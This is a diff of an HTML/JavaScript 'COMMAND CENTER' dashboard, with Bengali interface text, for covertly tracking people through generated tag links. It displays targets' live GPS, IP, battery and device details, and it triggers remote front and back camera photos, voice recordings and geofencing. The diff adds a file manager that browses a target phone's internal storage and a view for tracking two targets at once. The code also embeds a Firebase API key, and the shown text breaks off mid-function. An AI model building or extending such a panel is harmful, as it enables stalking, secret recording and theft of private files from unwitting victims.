@@ -33,7 +33,7 @@
             --pink: #ec4899;
             --text: #f1f5f9;
             --muted: #64748b;
-            --panel-w: 360px;
+            --panel-w: 380px;
         }
 
         body {
@@ -107,6 +107,7 @@
             z-index: 500;
             display: flex;
             gap: 10px;
+            flex-wrap: wrap;
         }
 
         .hud-chip {
@@ -184,17 +185,8 @@
         }
 
         @keyframes orbitPing {
-
-            0%,
-            100% {
-                transform: scale(1);
-                opacity: 1
-            }
-
-            50% {
-                transform: scale(1.5);
-                opacity: 0.5
-            }
+            0%,100% { transform: scale(1); opacity: 1 }
+            50% { transform: scale(1.5); opacity: 0.5 }
         }
 
         .panel-status-row {
@@ -246,11 +238,17 @@
         .ul-count {
             font-size: 9px;
             font-weight: 700;
-            color: var(--accent);
-            background: rgba(56, 189, 248, 0.1);
-            border: 1px solid rgba(56, 189, 248, 0.2);
+            color: var(--green);
+            background: rgba(16, 185, 129, 0.12);
+            border: 1px solid rgba(16, 185, 129, 0.25);
             padding: 2px 7px;
             border-radius: 99px;
+            animation: onlinePulse 2s ease-in-out infinite;
+        }
+
+        @keyframes onlinePulse {
+            0%,100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.3); }
+            50% { box-shadow: 0 0 0 4px rgba(16, 185, 129, 0); }
         }
 
         .user-tabs {
@@ -286,6 +284,13 @@
             color: var(--accent);
         }
 
+        /* Multi-select: second selected tab */
+        .user-tab.compare {
+            background: rgba(129, 140, 248, 0.12);
+            border-color: rgba(129, 140, 248, 0.4);
+            color: var(--accent2);
+        }
+
         .user-tab .tab-dot {
             width: 7px;
             height: 7px;
@@ -318,26 +323,18 @@
             background: rgba(56, 189, 248, 0.25);
         }
 
-        /* Add user button */
-        .add-user-btn {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 4px;
-            padding: 5px 10px;
-            border-radius: 8px;
-            cursor: pointer;
-            border: 1px dashed rgba(56, 189, 248, 0.3);
-            background: transparent;
-            font-size: 11px;
-            font-weight: 600;
-            color: var(--muted);
-            transition: all 0.2s;
+        .user-tab.compare .tab-serial {
+            background: rgba(129, 140, 248, 0.25);
+            color: var(--accent2);
         }
 
-        .add-user-btn:hover {
-            border-color: var(--accent);
-            color: var(--accent);
+        /* Multi-track hint */
+        .multi-hint {
+            font-size: 9px;
+            color: var(--muted);
+            margin-top: 5px;
+            text-align: center;
+            opacity: 0.7;
         }
 
         /* Panel Body */
@@ -390,17 +387,8 @@
         }
 
         @keyframes liveBlink {
-
-            0%,
-            100% {
-                opacity: 1;
-                transform: scale(1)
-            }
-
-            50% {
-                opacity: 0.4;
-                transform: scale(0.7)
-            }
+            0%,100% { opacity: 1; transform: scale(1) }
+            50% { opacity: 0.4; transform: scale(0.7) }
         }
 
         .status-text {
@@ -437,6 +425,7 @@
             line-height: 1.7;
             color: #cbd5e1;
             transition: border-color 0.3s;
+            word-break: break-word;
         }
 
         .address-box.error {
@@ -492,18 +481,19 @@
             background: rgba(0, 0, 0, 0.2);
             border-radius: 7px;
             font-size: 11.5px;
+            gap: 8px;
         }
 
         .info-label {
             color: var(--muted);
             font-weight: 500;
+            flex-shrink: 0;
         }
 
         .info-value {
             font-weight: 600;
             color: var(--text);
             text-align: right;
-            max-width: 62%;
             word-break: break-all;
             font-size: 11px;
         }
@@ -514,13 +504,8 @@
             font-size: 10.5px;
         }
 
-        .info-value.green {
-            color: var(--green);
-        }
-
-        .info-value.orange {
-            color: var(--orange);
-        }
+        .info-value.green { color: var(--green); }
+        .info-value.orange { color: var(--orange); }
 
         /* Movement Cards */
         .move-grid {
@@ -606,53 +591,17 @@
             transition: opacity 0.2s;
         }
 
-        .action-btn:hover::before {
-            opacity: 1;
-        }
+        .action-btn:hover::before { opacity: 1; }
+        .action-btn:active { transform: scale(0.94); }
 
-        .action-btn:active {
-            transform: scale(0.94);
-        }
-
-        .btn-ring {
-            background: linear-gradient(135deg, #ef4444, #b91c1c);
-            box-shadow: 0 3px 12px rgba(239, 68, 68, 0.25);
-        }
-
-        .btn-front {
-            background: linear-gradient(135deg, #8b5cf6, #6d28d9);
-            box-shadow: 0 3px 12px rgba(139, 92, 246, 0.25);
-        }
-
-        .btn-back {
-            background: linear-gradient(135deg, #6366f1, #4338ca);
-            box-shadow: 0 3px 12px rgba(99, 102, 241, 0.25);
-        }
-
-        .btn-audio {
-            background: linear-gradient(135deg, #ec4899, #be185d);
-            box-shadow: 0 3px 12px rgba(236, 72, 153, 0.25);
-        }
-
-        .btn-audio-long {
-            background: linear-gradient(135deg, #f43f5e, #9f1239);
-            box-shadow: 0 3px 12px rgba(244, 63, 94, 0.25);
-        }
-
-        .btn-geo {
-            background: linear-gradient(135deg, #f59e0b, #b45309);
-            box-shadow: 0 3px 12px rgba(245, 158, 11, 0.25);
-        }
-
-        .btn-geo.on {
-            background: linear-gradient(135deg, #10b981, #047857);
-            box-shadow: 0 3px 12px rgba(16, 185, 129, 0.25);
-        }
-
-        .btn-clear-route {
-            background: linear-gradient(135deg, #475569, #334155);
-            box-shadow: none;
-        }
+        .btn-ring { background: linear-gradient(135deg, #ef4444, #b91c1c); box-shadow: 0 3px 12px rgba(239,68,68,0.25); }
+        .btn-front { background: linear-gradient(135deg, #8b5cf6, #6d28d9); box-shadow: 0 3px 12px rgba(139,92,246,0.25); }
+        .btn-back { background: linear-gradient(135deg, #6366f1, #4338ca); box-shadow: 0 3px 12px rgba(99,102,241,0.25); }
+        .btn-audio { background: linear-gradient(135deg, #ec4899, #be185d); box-shadow: 0 3px 12px rgba(236,72,153,0.25); }
+        .btn-audio-long { background: linear-gradient(135deg, #f43f5e, #9f1239); box-shadow: 0 3px 12px rgba(244,63,94,0.25); }
+        .btn-geo { background: linear-gradient(135deg, #f59e0b, #b45309); box-shadow: 0 3px 12px rgba(245,158,11,0.25); }
+        .btn-geo.on { background: linear-gradient(135deg, #10b981, #047857); box-shadow: 0 3px 12px rgba(16,185,129,0.25); }
+        .btn-clear-route { background: linear-gradient(135deg, #475569, #334155); box-shadow: none; }
 
         /* Tag Link Generator */
         .tag-gen-box {
@@ -688,9 +637,7 @@
             outline: none;
         }
 
-        .tag-input:focus {
-            border-color: var(--border-accent);
-        }
+        .tag-input:focus { border-color: var(--border-accent); }
 
         .tag-gen-btn {
             padding: 7px 12px;
@@ -705,9 +652,7 @@
             transition: opacity 0.2s;
         }
 
-        .tag-gen-btn:hover {
-            opacity: 0.85;
-        }
+        .tag-gen-btn:hover { opacity: 0.85; }
 
         .tag-link-out {
             margin-top: 7px;
@@ -721,9 +666,7 @@
             display: none;
         }
 
-        .tag-link-out.show {
-            display: block;
-        }
+        .tag-link-out.show { display: block; }
 
         /* Media Boxes */
         .media-section {
@@ -734,9 +677,7 @@
             padding: 12px;
         }
 
-        .media-section.visible {
-            display: block;
-        }
+        .media-section.visible { display: block; }
 
         .media-header {
             display: flex;
@@ -760,20 +701,9 @@
             font-weight: 700;
         }
 
-        .badge-wait {
-            background: rgba(245, 158, 11, 0.15);
-            color: var(--orange);
-        }
-
-        .badge-ok {
-            background: rgba(16, 185, 129, 0.15);
-            color: var(--green);
-        }
-
-        .badge-err {
-            background: rgba(244, 63, 94, 0.15);
-            color: var(--red);
-        }
+        .badge-wait { background: rgba(245,158,11,0.15); color: var(--orange); }
+        .badge-ok { background: rgba(16,185,129,0.15); color: var(--green); }
+        .badge-err { background: rgba(244,63,94,0.15); color: var(--red); }
 
         .spy-img {
             width: 100%;
@@ -783,9 +713,7 @@
             margin-top: 6px;
         }
 
-        .spy-img.show {
-            display: block;
-        }
+        .spy-img.show { display: block; }
 
         .spy-audio {
             width: 100%;
@@ -794,9 +722,7 @@
             border-radius: 7px;
         }
 
-        .spy-audio.show {
-            display: block;
-        }
+        .spy-audio.show { display: block; }
 
         .media-btns {
             display: flex;
@@ -818,28 +744,14 @@
             transition: opacity 0.2s;
         }
 
-        .m-dl {
-            background: rgba(16, 185, 129, 0.15);
-            color: var(--green);
-            border: 1px solid rgba(16, 185, 129, 0.25) !important;
-        }
-
-        .m-del {
-            background: rgba(244, 63, 94, 0.15);
-            color: var(--red);
-            border: 1px solid rgba(244, 63, 94, 0.25) !important;
-        }
-
-        .media-btns a:hover,
-        .media-btns button:hover {
-            opacity: 0.75;
-        }
+        .m-dl { background: rgba(16,185,129,0.15); color: var(--green); border: 1px solid rgba(16,185,129,0.25) !important; }
+        .m-del { background: rgba(244,63,94,0.15); color: var(--red); border: 1px solid rgba(244,63,94,0.25) !important; }
+        .media-btns a:hover, .media-btns button:hover { opacity: 0.75; }
 
         /* Route History */
         .route-log {
             max-height: 80px;
             overflow-y: auto;
-            margin-top: 6px;
         }
 
         .route-log-item {
@@ -851,15 +763,13 @@
             justify-content: space-between;
         }
 
-        .route-log-item:last-child {
-            border-bottom: none;
-        }
+        .route-log-item:last-child { border-bottom: none; }
 
         /* Map Marker */
         .smart-marker {
             text-align: center;
             font-size: 30px;
-            filter: drop-shadow(0 2px 8px rgba(0, 0, 0, 0.7));
+            filter: drop-shadow(0 2px 8px rgba(0,0,0,0.7));
             transition: transform 0.4s;
         }
 
@@ -877,186 +787,151 @@
             font-size: 13px;
             font-weight: 500;
             backdrop-filter: blur(16px);
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6);
+            box-shadow: 0 8px 32px rgba(0,0,0,0.6);
             display: none;
             animation: toastIn 0.3s ease;
-            max-width: 260px;
+            max-width: 280px;
             line-height: 1.4;
         }
 
-        #toast.success {
-            border-color: rgba(16, 185, 129, 0.35);
-        }
-
-        #toast.error {
-            border-color: rgba(244, 63, 94, 0.35);
-        }
-
-        #toast.info {
-            border-color: rgba(56, 189, 248, 0.35);
-        }
+        #toast.success { border-color: rgba(16,185,129,0.35); }
+        #toast.error { border-color: rgba(244,63,94,0.35); }
+        #toast.info { border-color: rgba(56,189,248,0.35); }
 
         @keyframes toastIn {
-            from {
-                opacity: 0;
-                transform: translateY(16px)
-            }
-
-            to {
-                opacity: 1;
-                transform: translateY(0)
-            }
+            from { opacity: 0; transform: translateY(16px) }
+            to { opacity: 1; transform: translateY(0) }
         }
 
         /* Geofence Alert */
         #geoAlert {
             display: none;
             position: fixed;
-            top: 50%;
-            left: 50%;
+            top: 50%; left: 50%;
             transform: translate(-50%, -50%);
             z-index: 9999;
-            background: rgba(8, 12, 25, 0.98);
+            background: rgba(8,12,25,0.98);
             border: 2px solid var(--red);
             border-radius: 18px;
             padding: 28px 24px;
             text-align: center;
             backdrop-filter: blur(20px);
-            box-shadow: 0 0 60px rgba(244, 63, 94, 0.35);
+            box-shadow: 0 0 60px rgba(244,63,94,0.35);
             max-width: 300px;
             width: 90%;
             animation: alertAppear 0.4s ease;
         }
 
         @keyframes alertAppear {
-            from {
-                transform: translate(-50%, -50%) scale(0.8);
-                opacity: 0
-            }
-
-            to {
-                transform: translate(-50%, -50%) scale(1);
-                opacity: 1
-            }
+            from { transform: translate(-50%, -50%) scale(0.8); opacity: 0 }
+            to { transform: translate(-50%, -50%) scale(1); opacity: 1 }
         }
 
-        #geoAlert .geo-icon {
-            font-size: 36px;
-            margin-bottom: 10px;
-        }
-
-        #geoAlert h3 {
-            color: var(--red);
-            font-size: 18px;
-            margin-bottom: 6px;
-        }
-
-        #geoAlert p {
-            color: var(--muted);
-            font-size: 12px;
-            line-height: 1.6;
-        }
-
-        #geoAlert button {
-            margin-top: 16px;
-            background: var(--red);
-            color: white;
-            border: none;
-            padding: 9px 24px;
-            border-radius: 9px;
-            cursor: pointer;
-            font-weight: 700;
-            font-size: 13px;
-        }
+        #geoAlert .geo-icon { font-size: 36px; margin-bottom: 10px; }
+        #geoAlert h3 { color: var(--red); font-size: 18px; margin-bottom: 6px; }
+        #geoAlert p { color: var(--muted); font-size: 12px; line-height: 1.6; }
+        #geoAlert button { margin-top: 16px; background: var(--red); color: white; border: none; padding: 9px 24px; border-radius: 9px; cursor: pointer; font-weight: 700; font-size: 13px; }
 
         /* Confirm Dialog */
         #confirmDialog {
             display: none;
             position: fixed;
-            top: 50%;
-            left: 50%;
+            top: 50%; left: 50%;
             transform: translate(-50%, -50%);
             z-index: 9999;
-            background: rgba(8, 12, 25, 0.98);
+            background: rgba(8,12,25,0.98);
             border: 1px solid var(--border-accent);
             border-radius: 16px;
             padding: 24px;
             text-align: center;
             backdrop-filter: blur(20px);
-            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.7);
+            box-shadow: 0 8px 40px rgba(0,0,0,0.7);
             max-width: 280px;
             width: 88%;
         }
 
-        #confirmDialog p {
-            font-size: 13px;
-            color: var(--muted);
-            margin-bottom: 16px;
-            line-height: 1.6;
-        }
+        #confirmDialog p { font-size: 13px; color: var(--muted); margin-bottom: 16px; line-height: 1.6; }
 
-        .confirm-btns {
-            display: flex;
-            gap: 8px;
-        }
+        .confirm-btns { display: flex; gap: 8px; }
+        .confirm-btns button { flex: 1; padding: 9px; border: none; border-radius: 9px; font-weight: 700; font-size: 12px; cursor: pointer; }
+        .confirm-yes { background: var(--red); color: white; }
+        .confirm-no { background: var(--surface); color: var(--muted); border: 1px solid var(--border) !important; }
 
-        .confirm-btns button {
-            flex: 1;
-            padding: 9px;
-            border: none;
-            border-radius: 9px;
-            font-weight: 700;
-            font-size: 12px;
-            cursor: pointer;
+        /* File Manager Modal */
+        .file-modal {
+            display: none;
+            position: fixed;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 9999;
+            background: rgba(8,12,25,0.98);
+            border: 1px solid var(--border-accent);
+            border-radius: 16px;
+            width: 90%;
+            max-width: 380px;
+            max-height: 80vh;
+            flex-direction: column;
+            backdrop-filter: blur(20px);
+            box-shadow: 0 10px 50px rgba(0,0,0,0.8);
+            overflow: hidden;
+            animation: alertAppear 0.3s ease;
         }
+        .file-modal.show { display: flex; }
 
-        .confirm-yes {
-            background: var(--red);
-            color: white;
-        }
+        .fm-header { display: flex; justify-content: space-between; align-items: center; padding: 14px 16px; border-bottom: 1px solid var(--border); background: rgba(20, 184, 166, 0.05); }
+        .fm-title { font-weight: 700; color: #14b8a6; font-size: 13px; display: flex; align-items: center; gap: 8px;}
+        .fm-close { background: none; border: none; color: var(--muted); cursor: pointer; font-size: 14px; font-weight: bold; }
+        .fm-close:hover { color: var(--red); }
+        
+        .fm-path-bar { display: flex; align-items: center; gap: 8px; padding: 10px 16px; background: rgba(0,0,0,0.3); border-bottom: 1px solid var(--border); }
+        .fm-back-btn { background: var(--surface); color: var(--text); border: 1px solid var(--border); border-radius: 6px; padding: 4px 10px; cursor: pointer; transition: 0.2s; font-weight: bold; }
+        .fm-back-btn:disabled { opacity: 0.4; cursor: not-allowed; }
+        .fm-current-path { font-family: 'Orbitron', monospace; font-size: 10px; color: var(--muted); overflow: hidden; white-space: nowrap; text-overflow: ellipsis; flex: 1; }
 
-        .confirm-no {
-            background: var(--surface);
-            color: var(--muted);
-            border: 1px solid var(--border) !important;
-        }
+        .fm-body { flex: 1; overflow-y: auto; padding: 10px; min-height: 250px; display: flex; flex-direction: column; gap: 6px; }
+        .fm-item { display: flex; justify-content: space-between; align-items: center; padding: 10px 12px; background: var(--surface); border: 1px solid transparent; border-radius: 8px; cursor: pointer; transition: 0.2s; }
+        .fm-item:hover { background: rgba(20, 184, 166, 0.08); border-color: rgba(20, 184, 166, 0.3); }
+        .fm-item-main { display: flex; align-items: center; gap: 10px; overflow: hidden; }
+        .fm-icon { font-size: 18px; flex-shrink: 0; }
+        .fm-info { display: flex; flex-direction: column; overflow: hidden; }
+        .fm-name { font-size: 12px; font-weight: 600; color: var(--text); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .fm-meta { font-size: 9px; color: var(--muted); margin-top: 2px; }
+        .fm-dl-btn { background: rgba(16, 185, 129, 0.15); color: var(--green); border: 1px solid rgba(16, 185, 129, 0.3); padding: 5px 8px; border-radius: 6px; font-size: 10px; font-weight: 700; cursor: pointer; }
+        .fm-dl-btn:hover { background: var(--green); color: white; }
+
+        .fm-footer { padding: 12px 16px; border-top: 1px solid var(--border); }
+        .fm-empty { text-align: center; color: var(--muted); font-size: 11px; margin-top: 40px; line-height: 1.6; }
 
         /* Overlay backdrop */
         .overlay {
             display: none;
             position: fixed;
             inset: 0;
-            background: rgba(0, 0, 0, 0.5);
+            background: rgba(0,0,0,0.5);
             z-index: 9998;
             backdrop-filter: blur(4px);
         }
+        .overlay.show { display: block; }
 
-        .overlay.show {
-            display: block;
+        /* ── Compare Panel (second target) ── */
+        .compare-section {
+            background: rgba(129, 140, 248, 0.05);
+            border: 1px solid rgba(129, 140, 248, 0.2);
+            border-radius: 12px;
+            padding: 12px;
+            display: none;
         }
+        .compare-section.visible { display: block; }
+        .compare-section .section-title { color: var(--accent2); }
 
         @media (max-width: 400px) {
-            :root {
-                --panel-w: 100vw;
-            }
-
-            .panel {
-                border-right: none;
-            }
-
-            .map-hud {
-                left: 12px;
-            }
+            :root { --panel-w: 100vw; }
+            .panel { border-right: none; }
+            .map-hud { left: 12px; }
         }
 
-        ::-webkit-scrollbar {
-            width: 3px;
-        }
-
-        ::-webkit-scrollbar-thumb {
-            background: rgba(56, 189, 248, 0.15);
-            border-radius: 99px;
-        }
+        ::-webkit-scrollbar { width: 3px; }
+        ::-webkit-scrollbar-thumb { background: rgba(56,189,248,0.15); border-radius: 99px; }
     </style>
 </head>
 
@@ -1066,6 +941,7 @@
 
     <!-- HUD chips on map -->
     <div class="map-hud" id="mapHud" style="display:none;">
+        <div class="hud-chip">🎯 <span id="hudTag" class="val">--</span></div>
         <div class="hud-chip">🌐 <span id="hudIp" class="val">--</span></div>
         <div class="hud-chip">🔋 <span id="hudBat" class="val">--</span></div>
         <div class="hud-chip">⚡ <span id="hudSpeed" class="val">0 km/h</span></div>
@@ -1094,6 +970,24 @@
         </div>
     </div>
 
+    <!-- File Manager Modal -->
+    <div class="file-modal" id="fileModal">
+        <div class="fm-header">
+            <div class="fm-title">📁 Device Storage</div>
+            <button class="fm-close" onclick="closeFileManager()">✕</button>
+        </div>
+        <div class="fm-path-bar">
+            <button class="fm-back-btn" id="fmBackBtn" onclick="fmGoBack()" disabled>←</button>
+            <span class="fm-current-path" id="fmPath">/storage/emulated/0/</span>
+        </div>
+        <div class="fm-body" id="fmBody">
+            <!-- Content will be injected by JS -->
+        </div>
+        <div class="fm-footer" id="fmFooter">
+            <button class="action-btn btn-files full" style="background: linear-gradient(135deg, #14b8a6, #0f766e); box-shadow: 0 3px 12px rgba(20,184,166,0.25);" onclick="requestDirectory()">🔄 Request Refresh</button>
+        </div>
+    </div>
+
     <!-- Side Panel -->
     <div class="panel" id="mainPanel">
 
@@ -1104,7 +998,7 @@
                 COMMAND CENTER
             </div>
             <div class="panel-status-row">
-                <span style="font-size:10px;color:var(--muted);">Multi-Target v2.0</span>
+                <span style="font-size:10px;color:var(--muted);">Multi-Target v3.0</span>
                 <button class="hide-btn" onclick="togglePanel(false)">✕</button>
             </div>
         </div>
@@ -1118,6 +1012,7 @@
             <div class="user-tabs" id="userTabs">
                 <div style="font-size:11px;color:var(--muted);padding:4px 0;">Firebase থেকে লোড হচ্ছে...</div>
             </div>
+            <div class="multi-hint">💡 Click = Primary · Long-press = Compare (দুইজনকে একসাথে ট্র্যাক)</div>
         </div>
 
         <!-- Body -->
@@ -1140,34 +1035,25 @@
             <div class="tag-gen-box">
                 <div class="tag-gen-title">🔗 Tag Link তৈরি করুন</div>
                 <div class="tag-gen-row">
-                    <input type="number" class="tag-input" id="tagNumInput" placeholder="Tag নম্বর (যেমন: 2)" min="1"
-                        max="999">
+                    <input type="number" class="tag-input" id="tagNumInput" placeholder="Tag নম্বর (যেমন: 2)" min="1" max="999">
                     <button class="tag-gen-btn" onclick="generateTagLink()">Generate</button>
                 </div>
                 <div class="tag-link-out" id="tagLinkOut" onclick="copyTagLink()">লিংক লোড হচ্ছে...</div>
             </div>
 
-            <!-- Device Info -->
+            <!-- Primary Target Device Info -->
             <div class="section">
-                <div class="section-title">📱 Device Info</div>
+                <div class="section-title">📱 Primary Target — Device Info</div>
                 <div class="info-grid">
-                    <div class="info-row"><span class="info-label">Tag ID</span><span class="info-value accent"
-                            id="tagIdUI">--</span></div>
-                    <div class="info-row"><span class="info-label">Device</span><span class="info-value"
-                            id="deviceUI">--</span></div>
-                    <div class="info-row"><span class="info-label">Battery</span><span class="info-value green"
-                            id="batUI">--</span></div>
-                    <div class="info-row"><span class="info-label">IP Address</span><span class="info-value accent"
-                            id="ipUI">--</span></div>
-                    <div class="info-row"><span class="info-label">ISP / Network</span><span class="info-value"
-                            id="ispUI">--</span></div>
-                    <div class="info-row"><span class="info-label">GPS Accuracy</span><span class="info-value orange"
-                            id="accUI">--</span></div>
+                    <div class="info-row"><span class="info-label">Tag ID</span><span class="info-value accent" id="tagIdUI">--</span></div>
+                    <div class="info-row"><span class="info-label">Device / Model</span><span class="info-value" id="deviceUI" style="font-size:10.5px;">--</span></div>
+                    <div class="info-row"><span class="info-label">Battery</span><span class="info-value green" id="batUI">--</span></div>
+                    <div class="info-row"><span class="info-label">IP Address</span><span class="info-value accent" id="ipUI">--</span></div>
+                    <div class="info-row"><span class="info-label">ISP / Network</span><span class="info-value" id="ispUI" style="font-size:10.5px;">--</span></div>
+                    <div class="info-row"><span class="info-label">GPS Accuracy</span><span class="info-value orange" id="accUI">--</span></div>
                     <div class="info-row">
                         <span class="info-label">Open in Maps</span>
-                        <a id="mapsLink" href="#" target="_blank"
-                            style="font-size:11px;color:var(--accent);font-weight:700;text-decoration:none;">Google Maps
-                            ↗</a>
+                        <a id="mapsLink" href="#" target="_blank" style="font-size:11px;color:var(--accent);font-weight:700;text-decoration:none;">Google Maps ↗</a>
                     </div>
                 </div>
             </div>
@@ -1176,10 +1062,8 @@
             <div class="section">
                 <div class="section-title">🌐 Coordinates</div>
                 <div class="info-grid">
-                    <div class="info-row"><span class="info-label">Latitude</span><span class="info-value accent"
-                            id="latUI">--</span></div>
-                    <div class="info-row"><span class="info-label">Longitude</span><span class="info-value accent"
-                            id="lngUI">--</span></div>
+                    <div class="info-row"><span class="info-label">Latitude</span><span class="info-value accent" id="latUI">--</span></div>
+                    <div class="info-row"><span class="info-label">Longitude</span><span class="info-value accent" id="lngUI">--</span></div>
                 </div>
             </div>
 
@@ -1205,15 +1089,30 @@
                 </div>
             </div>
 
+            <!-- ═══ COMPARE Section (second target) ═══ -->
+            <div class="compare-section" id="compareSection">
+                <div class="section-title" style="color:var(--accent2);">📲 Compare Target — Device Info</div>
+                <div class="info-grid">
+                    <div class="info-row"><span class="info-label">Tag ID</span><span class="info-value" style="color:var(--accent2);font-family:'Orbitron',monospace;font-size:10.5px;" id="cmpTagId">--</span></div>
+                    <div class="info-row"><span class="info-label">Device</span><span class="info-value" id="cmpDevice" style="font-size:10.5px;">--</span></div>
+                    <div class="info-row"><span class="info-label">Battery</span><span class="info-value green" id="cmpBat">--</span></div>
+                    <div class="info-row"><span class="info-label">IP</span><span class="info-value" style="color:var(--accent2);font-size:10.5px;" id="cmpIp">--</span></div>
+                    <div class="info-row"><span class="info-label">Status</span><span class="info-value" id="cmpStatus">--</span></div>
+                    <div class="info-row"><span class="info-label">Location</span><span class="info-value accent" id="cmpLoc" style="font-size:10px;">--</span></div>
+                    <div class="info-row">
+                        <span class="info-label">Open Maps</span>
+                        <a id="cmpMapsLink" href="#" target="_blank" style="font-size:11px;color:var(--accent2);font-weight:700;text-decoration:none;">↗ Maps</a>
+                    </div>
+                </div>
+            </div>
+
             <!-- Route History -->
             <div class="section">
                 <div class="section-title">🗺 Route Log</div>
                 <div class="route-log" id="routeLog">
-                    <div style="font-size:11px;color:var(--muted);text-align:center;padding:8px 0;">No route data yet
-                    </div>
+                    <div style="font-size:11px;color:var(--muted);text-align:center;padding:8px 0;">No route data yet</div>
                 </div>
-                <button class="action-btn btn-clear-route full" style="margin-top:8px;font-size:11px;padding:7px;"
-                    id="clearRouteBtn">🗑 Clear Route</button>
+                <button class="action-btn btn-clear-route full" style="margin-top:8px;font-size:11px;padding:7px;" id="clearRouteBtn">🗑 Clear Route</button>
             </div>
 
             <!-- Remote Commands -->
@@ -1226,6 +1125,7 @@
                     <button class="action-btn btn-back" id="photoBackBtn">📸 Back Cam</button>
                     <button class="action-btn btn-audio-long full" id="audioLongBtn">🎙 Voice 15s (Extended)</button>
                     <button class="action-btn btn-geo full" id="geoBtn">🛡 Geofence: OFF</button>
+                    <button class="action-btn btn-files full" style="background: linear-gradient(135deg, #14b8a6, #0f766e); box-shadow: 0 3px 12px rgba(20,184,166,0.25);" onclick="openFileManager()">📁 File Manager / Storage</button>
                 </div>
             </div>
 
@@ -1261,7 +1161,7 @@
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
-        import { getDatabase, ref, onValue, set, remove, push } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
+        import { getDatabase, ref, onValue, set, remove } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
 
         const firebaseConfig = {
             apiKey: "AIzaSyAoQw5dhwS5JJZIWSPQTgKdMtB5ZEsoxLk",
@@ -1291,13 +1191,14 @@
         }, {}, { position: 'topright' }).addTo(map);
 
         // ─── State ────────────────────────────────────────────────────
-        let markers = {}; // tagId → marker
-        let accuracyCircles = {}; // tagId → circle
-        let routeLines = {}; // tagId → polyline
-        let routePoints = {}, routeHistories = {};
+        let markers = {};
+        let accuracyCircles = {};
+        let routeLines = {};
+        let routePoints = {};
 
-        let activeTagId = null; // currently selected tag
-        let currentData = {}; // live data per tag
+        let activeTagId = null;     // Primary selected tag
+        let compareTagId = null;    // Secondary (compare) tag
+        let currentData = {};       // All live data per tag
 
         let lastLat = 0, lastLng = 0;
         let geofenceOn = false, geofenceCircle = null, geofenceCenter = null;
@@ -1305,7 +1206,9 @@
         let geoAlertShown = false;
         let confirmCallback = null;
 
-        // Tag colors for markers
+        // Address cache per tag to avoid repeated fetches
+        let addrCache = {};         // tagId → { lat, lng, addr, ts }
+
         const TAG_COLORS = ['#f43f5e', '#38bdf8', '#10b981', '#f59e0b', '#8b5cf6', '#ec4899', '#06b6d4', '#84cc16'];
 
         // ─── Panel Toggle ─────────────────────────────────────────────
@@ -1358,19 +1261,29 @@
             return `${Math.floor(s / 3600)}h ago`;
         }
 
-        // ─── Address Fetch ────────────────────────────────────────────
-        let lastAddrTs = 0;
-        async function fetchAddress(lat, lng) {
+        // ─── Address Fetch (cached per tag) ───────────────────────────
+        async function fetchAddress(tagId, lat, lng) {
+            const cache = addrCache[tagId];
             const now = Date.now();
-            if (now - lastAddrTs < 12000) return;
-            lastAddrTs = now;
+            // Only re-fetch if moved >10m or 12s passed
+            if (cache && (now - cache.ts < 12000) &&
+                Math.abs(lat - cache.lat) < 0.0001 && Math.abs(lng - cache.lng) < 0.0001) {
+                if (tagId === activeTagId) {
+                    document.getElementById('addressUI').textContent = cache.addr;
+                    document.getElementById('addressBox').className = 'address-box';
+                }
+                return;
+            }
             try {
                 const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lng}&accept-language=bn,en`);
                 const d = await r.json();
                 const addr = d.display_name || 'Unknown location';
-                document.getElementById('addressUI').textContent = addr;
-                document.getElementById('addressBox').className = 'address-box';
-                addRouteLog(lat, lng, addr.split(',')[0]);
+                addrCache[tagId] = { lat, lng, addr, ts: now };
+                if (tagId === activeTagId) {
+                    document.getElementById('addressUI').textContent = addr;
+                    document.getElementById('addressBox').className = 'address-box';
+                    addRouteLog(lat, lng, addr.split(',')[0]);
+                }
             } catch { }
         }
 
@@ -1407,17 +1320,10 @@
             }
         };
 
-        // ─── Render Panel for selected tag ───────────────────────────
+        // ─── Render Panel for primary tag ──────────────────────────
         function renderPanelForTag(tagId) {
             const data = currentData[tagId];
             if (!data) return;
-
-            // Reset route state for this tag
-            lastLat = 0; lastLng = 0;
-            lastAddrTs = 0;
-            document.getElementById('routeLog').innerHTML = '<div style="font-size:11px;color:var(--muted);text-align:center;padding:8px 0;">No route data yet</div>';
-            document.getElementById('pointsUI').textContent = '0';
-            if (!routePoints[tagId]) routePoints[tagId] = 0;
 
             if (!data.isOnline) {
                 document.getElementById('statusDot').className = 'status-dot offline';
@@ -1433,6 +1339,7 @@
             document.getElementById('statusText').textContent = 'Live ●';
             document.getElementById('mapHud').style.display = 'flex';
             document.getElementById('tagIdUI').textContent = `Tag #${tagId.replace('tag', '')}`;
+            document.getElementById('hudTag').textContent = `#${tagId.replace('tag', '')}`;
 
             if (data.lastSeen) {
                 clearInterval(lastSeenTimer);
@@ -1441,16 +1348,17 @@
                 lastSeenTimer = setInterval(updateTS, 5000);
             }
 
+            // Full device model — no truncation
             document.getElementById('deviceUI').textContent = data.deviceInfo || '--';
             const batText = data.battery != null ? `${data.battery}% ${data.charging ? '⚡ Charging' : '🔋'}` : '--';
             document.getElementById('batUI').textContent = batText;
-            document.getElementById('hudBat').textContent = data.battery ? `${data.battery}%` : '--';
+            document.getElementById('hudBat').textContent = data.battery != null ? `${data.battery}%` : '--';
 
             const ip = data.ip_address || '--';
             const isp = data.isp || '--';
             document.getElementById('ipUI').textContent = ip;
             document.getElementById('ispUI').textContent = isp;
-            document.getElementById('hudIp').textContent = ip;
+            document.getElementById('hudIp').textContent = ip !== '--' ? ip : '..';
 
             if (data.status && (data.status.includes('Error') || data.status.includes('Denied') || data.status.includes('Lost'))) {
                 document.getElementById('addressUI').textContent = `⚠️ ${data.status}`;
@@ -1459,7 +1367,10 @@
             }
 
             const { latitude: lat, longitude: lng, accuracy, speed, heading } = data;
-            if (!lat || !lng) return;
+            if (!lat || !lng) {
